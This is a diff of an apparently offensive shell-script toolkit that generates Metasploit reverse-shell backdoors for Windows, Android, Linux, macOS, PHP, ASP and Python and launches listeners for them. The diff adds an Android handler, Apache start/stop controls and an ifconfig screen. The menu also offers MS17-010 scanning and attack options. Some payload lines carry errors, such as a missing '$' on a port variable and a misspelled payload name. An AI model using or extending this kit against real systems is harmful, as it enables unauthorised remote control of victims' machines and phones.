@@ -42,12 +42,14 @@ options(){
     echo ""
     echo "----------------------------------------------------------"
     echo "\033[31m [1]Nmap Tools. \033[0m"
-    echo "\033[33m [2]Create the MSF backdoor. \033[0m"
-    echo "\033[36m [3]Start msfconsole. \033[0m"
-    echo "\033[35m [4]Set local IP&&port. \033[0m"
-    echo "\033[39m [5]About. \033[0m"
+    echo "\033[32m [2]Create the MSF backdoor. \033[0m"
+    echo "\033[33m [3]Start msfconsole. \033[0m"
+    echo "\033[34m [4]Set local IP&&port. \033[0m"
+    echo "\033[35m [5]Start Apache2. \033[0m"
+    echo "\033[36m [6]ifconfig. \033[0m"
+    echo "\033[37m [7]About. \033[0m"
     echo ""
-    echo "\033[37m [0]Back. \033[0m"
+    echo "\033[37m [0]Exit. \033[0m"
     echo "----------------------------------------------------------"
     echo ""
     read -p "Please select : " options_numb
@@ -67,9 +69,42 @@ options(){
     get
     ;;
     "5" )
+    apache2
+    ;;
+    "6" )
+    showip
+    ;;
+    "7" )
     about
     ;;
     * )
+    clear
+    exitexit
+    esac
+}
+
+#exitexit
+exitexit(){
+    /etc/init.d/apache2 stop
+    echo "apache2 server stop... [OK]"
+    echo ": D"
+    sleep 2
+    clear
+    exit
+}
+
+#showip
+showip(){
+    clear
+    nutssss
+    ifconfig
+    echo ""
+    echo "---------------------------------------------------------------------------------------"
+    echo ""
+    echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
+    read -p "" enterback
+    case $enterback in
+    *)
     clear
     options;
     esac
@@ -207,7 +242,7 @@ create_msf(){
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport -f exe > ~/nutsssstools/nutssss-tools-msfvenom.exe
     echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.exe \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -221,7 +256,7 @@ create_msf(){
     msfvenom -p android/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport R > ~/nutsssstools/nutssss-tools-msfvenom.apk
     echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.apk \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -235,7 +270,7 @@ create_msf(){
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport -f elf > ~/nutsssstools/nutssss-tools-msfvenom.elf
     echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.elf \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -249,7 +284,7 @@ create_msf(){
     msfvenom -p osx/x86/shell_reverse_tcp LHOST=$myip LPORT=$myport -f macho > ~/nutsssstools/nutssss-tools-msfvenom.macho
     echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.macho \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -263,7 +298,7 @@ create_msf(){
     msfvenom -p php/meterpreter_reverse_tcp LHOST=$myip LPORT=myport -f raw > ~/nutsssstools/nutssss-tools-msfvenom.php
     echo "\033[36m [OK!] File path: ~/nutssss-tools-msfvenom.php \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -277,7 +312,7 @@ create_msf(){
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$myport -f asp > ~/nutsssstools/nutssss-tools-msfvenom.asp
     echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.asp \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -291,7 +326,7 @@ create_msf(){
     msfvenom -p python/meterpreter/reverser_tcp LHOST=$myip LPORT=$myport -f raw > ~/nutsssstools/nutssss-tools-msfvenom.py
     echo "\033[36m [OK!] File path :  ~/nutssss-tools-msfvenom.py \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -305,7 +340,7 @@ create_msf(){
     msfvenom -p windows/meterpreter/reverse_http LHOST=$myip LPORT=$myport -f c
     echo "\033[36m [OK!] Copy to VS compile to exe! \033[0m"
     echo ""
-     echo "---------------------------------------------------------------------------------------"
+    echo "---------------------------------------------------------------------------------------"
     echo ""
     echo "\033[31m\033[01m\033[05m Press Enter to return. \033[0m"
     read -p "" enterback
@@ -335,7 +370,7 @@ start_msf(){
     echo "\033[33m [1]LAN scans MS17-010 loophole host.  \033[0m"
     echo "\033[33m [2]Attack MS17-010 loophole host. \033[0m"
     echo "\033[33m [3]Win TCP. \033[0m"
-    #echo "\033[33m [4]. \033[0m"
+    echo "\033[33m [4]Android TCP. \033[0m"
     #echo "\033[33m [5]. \033[0m"
     #echo "\033[33m [6]. \033[0m"
     #echo "\033[33m [7]. \033[0m"
@@ -359,9 +394,48 @@ start_msf(){
     msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST $myip;set LPORT $myport;run;"
     start_msf
     ;;
+    "4" )
+    msfconsole -x "use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST $myip;set LPORT $myport;run;"
+    start_msf
+    ;;
     * )
     clear
     create_msf;
+    esac
+}
+
+#apache2
+apache2(){
+    clear
+    nutssss
+    echo ""
+    echo ""
+    echo "----------------------------------------------------------"
+    echo ""
+    echo " [1] apache2 server start!"
+    echo " [2] apache2 server stop!"
+    echo ""
+    echo "\033[37m [0]Back. \033[0m"
+    echo ""
+    echo "----------------------------------------------------------"
+    echo ""
+    read -p "Please select : " apache2_select
+    case $apache2_select in
+    "1" )
+    /etc/init.d/apache2 start
+    sleep 1
+    clear
+    options
+    ;;
+    "2" )
+    /etc/init.d/apache2 stop
+    sleep 1
+    clear
+    options
+    ;;
+    * )
+    clear
+    options;
     esac
 }
 
